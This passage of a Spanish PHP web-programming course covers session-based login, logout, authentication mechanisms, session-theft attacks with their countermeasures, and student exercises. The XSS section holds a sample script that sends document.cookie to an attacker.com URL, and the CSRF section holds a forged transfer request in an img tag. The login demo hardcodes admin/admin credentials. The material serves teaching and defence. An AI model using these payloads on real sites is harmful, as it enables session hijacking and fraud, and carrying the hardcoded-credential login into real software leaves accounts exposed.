+<span class="linenos" data-linenos="10 "></span>        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#39;password&#39;</span><span class="p">&gt;</span>Contraseña:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="11 "></span>        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;password&#39;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;inputPassword&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;password&#39;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;50&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="12 "></span>    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="13 "></span>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;fila&#39;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="14 "></span>        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;submit&#39;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;enviar&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;Enviar&#39;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="15 "></span>    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="16 "></span>  <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="17 "></span><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Al hacer <em>submit</em> nos lleva a <code>login.php</code>, el cual hace de controlador:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span><span class="c1">// Comprobamos si ya se ha enviado el formulario</span>
+<span class="linenos" data-linenos=" 3 "></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;enviar&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="nv">$usuario</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inputUsuario&#39;</span><span class="p">];</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inputPassword&#39;</span><span class="p">];</span>
+<span class="linenos" data-linenos=" 6 "></span>
+<span class="linenos" data-linenos=" 7 "></span>    <span class="c1">// validamos que recibimos ambos parámetros</span>
+<span class="linenos" data-linenos=" 8 "></span>    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$usuario</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 9 "></span>        <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;Debes introducir un usuario y contraseña&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="10 "></span>        <span class="k">include</span> <span class="s2">&quot;index.php&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="11 "></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="linenos" data-linenos="12 "></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$usuario</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="linenos" data-linenos="13 "></span>            <span class="c1">// almacenamos el usuario en la sesión</span>
+<span class="linenos" data-linenos="14 "></span>            <span class="nb">session_start</span><span class="p">();</span>
+<span class="linenos" data-linenos="15 "></span>            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$usuario</span><span class="p">;</span>
+<span class="linenos" data-linenos="16 "></span>            <span class="c1">// cargamos la página principal</span>
+<span class="linenos" data-linenos="17 "></span>            <span class="k">include</span> <span class="s2">&quot;main.php&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="18 "></span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="linenos" data-linenos="19 "></span>            <span class="c1">// Si las credenciales no son válidas, se vuelven a pedir</span>
+<span class="linenos" data-linenos="20 "></span>            <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;Usuario o contraseña no válidos!&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="21 "></span>            <span class="k">include</span> <span class="s2">&quot;index.php&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="22 "></span>        <span class="p">}</span>
+<span class="linenos" data-linenos="23 "></span>    <span class="p">}</span>
+<span class="linenos" data-linenos="24 "></span><span class="p">}</span>
+</code></pre></div>
+<p>Dependiendo del usuario que se haya logueado, vamos a ir a una vista o a otra. Por ejemplo, en <code>main.php</code> tendríamos:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="c1">// Recuperamos la información de la sesión</span>
+<span class="linenos" data-linenos=" 3 "></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 4 "></span>        <span class="nb">session_start</span><span class="p">();</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="p">}</span>
+<span class="linenos" data-linenos=" 6 "></span>
+<span class="linenos" data-linenos=" 7 "></span>    <span class="c1">// Y comprobamos que el usuario se haya autentificado</span>
+<span class="linenos" data-linenos=" 8 "></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;usuario&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 9 "></span>        <span class="c1">// die, al igual que exit escribe su mensaje y ya no ejecuta nada más del script</span>
+<span class="linenos" data-linenos="10 "></span>        <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Error - debe &lt;a href=&#39;index.php&#39;&gt;identificarse&lt;/a&gt;.&lt;br /&gt;&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos="11 "></span>    <span class="p">}</span>
+<span class="linenos" data-linenos="12 "></span><span class="cp">?&gt;</span>
+<span class="linenos" data-linenos="13 "></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="linenos" data-linenos="14 "></span><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;es&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="15 "></span><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="16 "></span>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="17 "></span>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="18 "></span>    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Listado de productos<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="19 "></span><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="20 "></span><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="21 "></span>    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Bienvenido <span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;usuario&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="22 "></span>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Pulse <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;logout.php&quot;</span><span class="p">&gt;</span>aquí<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> para salir<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="23 "></span>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Volver al <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;main.php&quot;</span><span class="p">&gt;</span>inicio<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="24 "></span>    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Listado de productos<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="25 "></span>    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="26 "></span>        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>Producto 1<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="27 "></span>        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>Producto 2<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="28 "></span>        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>Producto 3<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="29 "></span>    <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="30 "></span><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="31 "></span><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Finalmente, necesitamos la opción de cerrar la sesión que colocamos en <code>logout.php</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="c1">// Recuperamos la información de la sesión</span>
+<span class="linenos" data-linenos="3 "></span><span class="nb">session_start</span><span class="p">();</span>
+<span class="linenos" data-linenos="4 "></span>
+<span class="linenos" data-linenos="5 "></span><span class="c1">// Y la destruimos</span>
+<span class="linenos" data-linenos="6 "></span><span class="nb">session_unset</span><span class="p">();</span>
+<span class="linenos" data-linenos="7 "></span><span class="nb">session_destroy</span><span class="p">();</span>
+<span class="linenos" data-linenos="8 "></span><span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: index.php&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos="9 "></span><span class="cp">?&gt;</span>
+</code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Autenticación en producción</p>
+<p>En la actualidad la autenticación de usuario no se realiza gestionando la sesión direcamente, sino que se realiza mediante algún framekwork que abstrae todo el proceso o la integración de mecanismos de autenticación tipo <em>OAuth</em>, como  estudiaremos en la última unidad mediante <em>Laravel</em>.</p>
+</div>
+<h3 id="otros-mecanismos">Otros mecanismos<a class="headerlink" href="#otros-mecanismos" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th><strong>Mecanismo de Autenticación</strong></th>
+<th><strong>Descripción</strong></th>
+<th><strong>Implementación</strong></th>
+<th><strong>Seguridad</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Sesiones</strong></td>
+<td>Utiliza sesiones del servidor para almacenar la información del usuario después de iniciar sesión.</td>
+<td>Usa <code>$_SESSION</code> para almacenar y verificar los datos del usuario.</td>
+<td>Configura cookies con <code>HttpOnly</code> y <code>Secure</code>.</td>
+</tr>
+<tr>
+<td><strong>Cookies (Recordar sesión)</strong></td>
+<td>Permite al usuario permanecer conectado mediante un token almacenado en una cookie.</td>
+<td>Guarda un token hash en la cookie y verifica con la base de datos.</td>
+<td>Usa cookies seguras y renueva el token regularmente.</td>
+</tr>
+<tr>
+<td><strong>JWT (JSON Web Token)</strong></td>
+<td>Utiliza tokens sin estado para autenticar usuarios, ideal para APIs REST.</td>
+<td>Usa la biblioteca <code>firebase/php-jwt</code> para crear y validar tokens.</td>
+<td>Configura tiempos de expiración cortos y almacena tokens de refresco.</td>
+</tr>
+<tr>
+<td><strong>OAuth (Redes sociales)</strong></td>
+<td>Permite iniciar sesión con cuentas de Google, Facebook, GitHub, etc.</td>
+<td>Usa bibliotecas como <code>PHPoAuthLib</code> o las APIs de las redes sociales.</td>
+<td>Valida siempre los datos recibidos del proveedor de OAuth.</td>
+</tr>
+<tr>
+<td><strong>Autenticación de dos factores (2FA)</strong></td>
+<td>Requiere una contraseña y un código adicional (enviado al correo o teléfono).</td>
+<td>Usa bibliotecas como <code>Google Authenticator</code> para generar códigos TOTP o podemos utilizar un aleatorio propio.</td>
+<td>Proporciona alta seguridad, aunque requiere más gestión.</td>
+</tr>
+<tr>
+<td><strong>Enlaces mágicos (Magic Links)</strong></td>
+<td>El usuario recibe un enlace de un solo uso por correo electrónico para iniciar sesión.</td>
+<td>Genera un token de un solo uso y envíalo por correo.</td>
+<td>Expira rápidamente y se usa solo una vez.</td>
+</tr>
+<tr>
+<td><strong>IP y User-Agent</strong></td>
+<td>Autentica al usuario teniendo en cuenta la IP y el User-Agent del navegador.</td>
+<td>Usa <code>$_SERVER['REMOTE_ADDR']</code> y <code>$_SERVER['HTTP_USER_AGENT']</code>.</td>
+<td>Puede mejorar la seguridad, pero es menos confiable.</td>
+</tr>
+<tr>
+<td><strong>Biométrica</strong></td>
+<td>Utiliza datos biométricos como huellas digitales o reconocimiento facial.</td>
+<td>Se implementa generalmente en aplicaciones móviles, con PHP manejando los datos en el backend.</td>
+<td>Altamente seguro, pero depende del soporte del dispositivo.</td>
+</tr>
+<tr>
+<td><strong>CAPTCHA</strong></td>
+<td>Protege el formulario de inicio de sesión de bots y ataques de fuerza bruta.</td>
+<td>Usa <code>Google reCAPTCHA</code> para validar la autenticidad del usuario.</td>
+<td>Buena medida adicional para formularios públicos.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="robos-de-sesion">Robos de sesión<a class="headerlink" href="#robos-de-sesion" title="Permanent link">&para;</a></h3>
+<p>A continuación, se describen algunos métodos comunes utilizados para robar la sesión de un usuario, junto con las contramedidas necesarias para evitar estos ataques. </p>
+<h4 id="1-ataque-de-cross-site-scripting-xss">1. <strong>Ataque de Cross-Site Scripting (XSS)</strong><a class="headerlink" href="#1-ataque-de-cross-site-scripting-xss" title="Permanent link">&para;</a></h4>
+<p>Los ataques XSS aprovechan vulnerabilidades en el código para inyectar scripts maliciosos en páginas web visitadas por otros usuarios. Estos scripts pueden acceder a las cookies de sesión y enviarlas al atacante.</p>
+<p>Ejemplo:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;comentario&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;script&gt;fetch(&#39;https://attacker.com?cookie=&#39; + document.cookie)&lt;/script&gt;&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>El código inyectado envía la cookie de sesión a una URL controlada por el atacante.</p>
+<p>Contramedidas:</p>
+<ul>
+<li>Escapar y sanear entradas: Utiliza funciones como <code>htmlspecialchars()</code> en PHP para escapar caracteres especiales.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="x">$comentario = htmlspecialchars($_POST[&#39;comentario&#39;], ENT_QUOTES, &#39;UTF-8&#39;);</span>
+</code></pre></div>
+<ul>
+<li>Política de Seguridad de Contenidos (CSP): Implementa CSP para restringir el origen de scripts.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="err">Content-Security-Policy: script-src &#39;self&#39;;</span>
+</code></pre></div>
+<h4 id="2-ataque-de-man-in-the-middle-mitm">2. <strong>Ataque de Man-in-the-Middle (MitM)</strong><a class="headerlink" href="#2-ataque-de-man-in-the-middle-mitm" title="Permanent link">&para;</a></h4>
+<p>Si el sitio no utiliza HTTPS, un atacante puede interceptar el tráfico y capturar cookies de sesión no cifradas.</p>
+<p>Ejemplo: El atacante usa herramientas como Wireshark para capturar cookies en una red pública.</p>
+<p>Contramedidas:</p>
+<ul>
+<li>Usar HTTPS: Asegura que todas las conexiones sean a través de HTTPS.</li>
+<li>Configurar cookies como <code>Secure</code>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="x">session_set_cookie_params([&#39;secure&#39; =&gt; true]);</span>
+</code></pre></div>
+<h4 id="3-robo-de-cookies-con-ingenieria-social-o-phishing">3. <strong>Robo de Cookies con Ingeniería Social o Phishing</strong><a class="headerlink" href="#3-robo-de-cookies-con-ingenieria-social-o-phishing" title="Permanent link">&para;</a></h4>
+<p>El atacante engaña al usuario para que acceda a un enlace malicioso y revela su cookie de sesión.</p>
+<p>Ejemplo: El atacante envía un enlace de phishing simulando la página de inicio de sesión.</p>
+<p>Contramedidas:</p>
+<ul>
+<li>Educación sobre phishing: Enseña a los usuarios a identificar sitios y correos fraudulentos.</li>
+<li>Autenticación de dos factores (2FA): Añade una capa extra de seguridad.</li>
+</ul>
+<h4 id="4-cross-site-request-forgery-csrf">4. <strong>Cross-Site Request Forgery (CSRF)</strong><a class="headerlink" href="#4-cross-site-request-forgery-csrf" title="Permanent link">&para;</a></h4>
+<p>CSRF, o falsificación de petición en sitios cruzados, es un ataque web malicioso donde un atacante engaña a un usuario para que transmita comandos no autorizados a un sitio en el que confía. </p>
+<p>Ejemplo: Un enlace malicioso ejecuta una solicitud usando la sesión activa del usuario en otro sitio web.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://tusitio.com/transferir?cantidad=100&amp;cuenta=atacante&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Contramedidas:</p>
+<ul>
+<li>Uso de tokens CSRF:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="x">// Generar token</span>
+<span class="linenos" data-linenos="2 "></span><span class="x">$_SESSION[&#39;csrf_token&#39;] = bin2hex(random_bytes(32));</span>
+<span class="linenos" data-linenos="3 "></span><span class="x">echo &#39;&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&#39;.$_SESSION[&#39;csrf_token&#39;].&#39;&quot;&gt;&#39;;</span>
+<span class="linenos" data-linenos="4 "></span>
+<span class="linenos" data-linenos="5 "></span><span class="x">// Validar token</span>
+<span class="linenos" data-linenos="6 "></span><span class="x">if ($_POST[&#39;csrf_token&#39;] !== $_SESSION[&#39;csrf_token&#39;]) {</span>
+<span class="linenos" data-linenos="7 "></span><span class="x">    die(&#39;Solicitud inválida&#39;);</span>
+<span class="linenos" data-linenos="8 "></span><span class="x">}</span>
+</code></pre></div>
+<ul>
+<li>Configurar cookies con <code>SameSite</code>:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="x">session_set_cookie_params([&#39;samesite&#39; =&gt; &#39;Strict&#39;]);</span>
+</code></pre></div>
+<h2 id="46-resumen">4.6 Resumen<a class="headerlink" href="#46-resumen" title="Permanent link">&para;</a></h2>
+<p>En este tema sobre <strong>Programación Web en Entorno Servidor</strong>, nos centramos en cómo PHP gestiona la interacción cliente-servidor y mantiene el <strong>estado</strong> en el protocolo HTTP, que es inherentemente <em>stateless</em>.</p>
+<h3 id="i-datos-y-peticiones-41-42">I. Datos y Peticiones (4.1, 4.2)<a class="headerlink" href="#i-datos-y-peticiones-41-42" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Superglobales:</strong> PHP usa <em>arrays</em> globales para acceder a la información de la petición y del servidor. Los principales son: <code>$_SERVER</code>, <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, <code>$_SESSION</code> y <code>$_FILES</code>. Es crucial distinguir entre <strong>URL</strong> (localización) y <strong>URI</strong> (identificador del recurso).</li>
+<li><strong>Formularios:</strong> Se puede utilizar el método <strong>GET</strong> (datos en URL, limitado, cacheable, idempotente) o <strong>POST</strong> (datos ocultos, sin límite de tamaño, no cacheable, no idempotente).</li>
+<li><strong>Validación:</strong> Siempre se debe aplicar <em>validación doble</em>: en el cliente (JS) y en el servidor.</li>
+<li><strong>Subida de Archivos:</strong> Requiere <code>method="POST"</code> y <code>enctype="multipart/form-data"</code>. Se procesa usando <code>$_FILES</code>, y es necesario usar <code>is_uploaded_file()</code> y <code>move_uploaded_file()</code>. La carpeta destino debe tener <strong>permisos de escritura</strong>.</li>
+</ul>
+<h3 id="ii-comunicacion-y-estado-43-44">II. Comunicación y Estado (4.3, 4.4)<a class="headerlink" href="#ii-comunicacion-y-estado-43-44" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Cabeceras de Respuesta:</strong> Son metadatos que el servidor envía al navegador <em>antes</em> del contenido. Se configuran con la función <strong><code>header()</code></strong> y se usan para realizar <strong>redirecciones</strong> (<code>Location</code>), controlar la <em>caché</em> o definir el tipo de contenido. Deben ser lo primero a devolver.</li>
+<li><strong>Gestión de Estado:</strong><ul>
+<li><strong>Cookies:</strong> Almacenadas en el <em>navegador del cliente</em>. Se crean con <strong><code>setcookie()</code></strong> (que debe ejecutarse antes de cualquier salida) y se acceden mediante <code>$_COOKIE</code>.</li>
+<li><strong>Sesión:</strong> Almacena la información en el <em>servidor web</em>. Requiere <strong><code>session_start()</code></strong>. La información se guarda en <strong><code>$_SESSION</code></strong>. Para finalizar se usa <code>session_unset()</code> y <code>session_destroy()</code>. Para recuperar objetos, es necesario <em>incluir la definición de su clase</em> previamente.</li>
+</ul>
+</li>
+</ul>
+<h3 id="iii-seguridad-y-autentificacion-45">III. Seguridad y Autentificación (4.5)<a class="headerlink" href="#iii-seguridad-y-autentificacion-45" title="Permanent link">&para;</a></h3>
+<ul>
+<li>La autentificación se basa en almacenar el usuario autenticado en <code>$_SESSION</code> tras validar las credenciales. El cierre de sesión destruye la sesión.</li>
+<li><strong>Contramedidas de Seguridad (Robo de Sesión):</strong><ul>
+<li>Contra <strong>XSS</strong>: <strong>Escapar y sanear entradas</strong> del usuario usando <code>htmlspecialchars()</code>.</li>
+<li>Contra <strong>MitM</strong>: Utilizar <strong>HTTPS</strong> y configurar cookies como <strong><code>Secure</code></strong>.</li>
+<li>Contra <strong>CSRF</strong>: Implementar <strong>tokens CSRF</strong> y configurar el atributo <strong><code>SameSite</code></strong> de las cookies.</li>
+<li>Para evitar que <em>scripts</em> accedan a las cookies de sesión, usar el parámetro <strong><code>httponly</code></strong>.</li>
+</ul>
+</li>
+</ul>
+<h2 id="47-referencias">4.7 Referencias<a class="headerlink" href="#47-referencias" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://www.php.net/manual/es/features.cookies.php">Cookies en PHP</a></li>
+<li><a href="https://www.php.net/manual/es/book.session.php">Manejo de sesiones en PHP</a></li>
+</ul>
+<h2 id="48-actividades">4.8 Actividades<a class="headerlink" href="#48-actividades" title="Permanent link">&para;</a></h2>
+<h3 id="variables-de-servidor">Variables de servidor<a class="headerlink" href="#variables-de-servidor" title="Permanent link">&para;</a></h3>
+<ol start="401">
+<li><code>401server.php</code>: igual que el ejemplo visto en los apuntes, muestra los valores de <code>$_SERVER</code> al ejecutar un script en tu ordenador.<br />
+Prueba a pasarle parámetros por GET (y a no pasarle ninguno).<br />
+Prepara un formulario (<code>401post.html</code>) que haga un envío por POST y compruébalo de nuevo.<br />
+Crea una página (<code>401enlace.html</code>) que tenga un enlace a <code>401server.php</code> y comprueba el valor de <code>HTTP_REFERER</code>.</li>
+</ol>
+<h3 id="formularios">Formularios<a class="headerlink" href="#formularios" title="Permanent link">&para;</a></h3>
+<ol start="402">
+<li>
+<p><code>402formulario.html</code> y <code>402formulario.php</code>: Crea un formulario que solicite:</p>
+<ul>
+<li>Nombre y apellidos.</li>
+<li>Email.</li>
+<li>URL página personal.</li>
+<li>Sexo (radio).</li>
+<li>Número de convivientes en el domicilio.</li>
+<li>Aficiones (checkboxes) – poner mínimo 4 valores.</li>
+<li>Menú favorito (lista selección múltiple) – poner mínimo 4 valores.</li>
+</ul>
+<p>Muestra los valores cargados en una tabla-resumen.</p>
+</li>
+<li>
+<p><code>403validacion.php</code>: A partir del formulario anterior, introduce validaciones en HTML mediante el atributo <code>required</code> de los campos (uso los tipos adecuados para cada campo), y comprueba que los tipos de los datos cumplen los valores esperados (por ejemplo, en los checkboxes que los valores recogidos forman parte de todos los posibles). Puedes probar a pasarle datos erroneos via URL y comprobar su comportamiento.<br />
+Tip: Investiga el uso de la función <code>filter_var</code>.</p>
+</li>
+<li>
+<p><code>404subida.html</code> y <code>404subida.php</code>: Crea un formulario que permita subir un archivo al servidor.
+Además del fichero, debe pedir en el mismo formulario dos campos numéricos que soliciten la anchura y la altura. Comprueba que tanto el fichero como los datos llegan correctamente.</p>
+</li>
+<li>
+<p><code>405subidaImagen.php</code>: Modifica el ejercicio anterior para que únicamente permita subir imágenes (comprueba la propiedad <code>type</code> del archivo subido). Si el usuario selecciona otro tipo de archivos, se le debe informar del error y permitir que suba un nuevo archivo.<br />
+En el caso de subir el tipo correcto, visualizar la imagen con el tamaño de anchura y altura recibido como parámetro.</p>
+</li>
+</ol>
+<h3 id="cabeceras">Cabeceras<a class="headerlink" href="#cabeceras" title="Permanent link">&para;</a></h3>
+<ol start="410">
+<li>
+<p>Crea los siguientes archivos:</p>
+<ul>
+<li><code>410redireccionExterna.php</code> que redirija automáticamente al usuario a la página oficial de PHP. </li>
+<li><code>410redireccionInterna.php</code> que redirija a la página <code>402formulario.html</code>. </li>
+<li><code>410redirecionTiempo.php</code> que redirija a una página externa pasados 3 segundos. Pista: <code>header("Refresh: 3; url=bienvenida.php");</code></li>
+</ul>
+</li>
+<li>
+<p><code>411json.php</code>: Crea un array asociativo con los datos <code>["nombre" =&gt; "Jose", "edad" =&gt; 34]</code> y muéstralo convirtiéndolo antes a JSON mediante <code>json_encode(array)</code>. Ejecútalo cambiando en la cabecera el <em>tipo de contenido</em> probando <code>text/html</code>, <code>text/plain</code> y <code>application/json</code>.</p>
+</li>
+<li>
+<p><code>412nocache.php</code>: Muestra la hora actual mediante <code>date("H:i:s")</code> y evita que el navegador la guarde en caché. Recuerda recargar la página directamente desde la barra de direcciones del navegador y no pulsar el botón de recarga.</p>
+</li>
+<li>
+<p><code>413cabeceraError.php</code>: Muetra una página de error con el contenido <code>&lt;h1&gt;Error 404&lt;/h1&gt;&lt;p&gt;La página no existe.&lt;/p&gt;</code> enviando el código 404 en el estado de la respuesta de la cabecera.</p>
+</li>
+</ol>
+<h3 id="cookies-y-sesion">Cookies y Sesión<a class="headerlink" href="#cookies-y-sesion" title="Permanent link">&para;</a></h3>
+<ol start="420">
+<li>
+<p><code>420aceptarCookies.php</code>: Nada más aterrizar en la página informa al usuario que debe aceptar las cookies para acceder al contenido. Crea un enlace para ello que envíe a la misma página por GET la variable <code>aceptar</code> y cuando se reciba, crees la cookie. En el contenido muestra una imagen cualquiera en el caso de que exista la cookie.</p>
+</li>
+<li>
+<p><code>421contadorVisitas.php</code>: Mediante el uso de cookies, informa al usuario de si es su primera visita, o si no lo es, muestre su valor (valor de un contador).
+Además, debes permitir que el usuario reinicie su contador de visitas.</p>
+</li>
+<li>
+<p><code>422fondo.php</code>: Mediante el uso de cookies, crea una página con un desplegable con varios colores, de manera que el usuario pueda cambiar el color de fondo de la página (utiliza estilos CSS en la misma página).
+Al cerrar la página, ésta debe recordar, al menos durante 24h, el color elegido y la próxima vez que se cargue la pagina, lo haga con el último color seleccionado.</p>
+</li>
+<li>
+<p><code>423fondoSesion1.php</code>: Modifica el ejercicio anterior para almacenar el color de fondo en la sesión y no emplear cookies. Además, debe contener un enlace al siguiente archivo.
+    <code>423fondoSesion2.php</code>: Debe mostrar el color y dar la posibilidad de:</p>
+<ul>
+<li>volver a la página anterior mediante un enlace</li>
+<li>y mediante otro enlace, vaciar la sesión y volver a la página anterior.</li>
+</ul>
+</li>
+<li>
+<p>Haciendo uso de la sesión, vamos a dividir el formulario del ejercicio <code>402formulario.php</code> en 2 subformularios:</p>
+<ul>
+<li><code>424formulario1.php</code> envía los datos (nombre y apellidos, email, url y sexo) a <code>424formulario2.php</code>.</li>
+<li><code>424formulario2.php</code> lee los datos y los mete en la sesión. A continuación, muestra el resto de campos del formulario a rellenar (convivientes, aficiones y menú). Envía estos datos a <code>424formulario3.php</code>.</li>
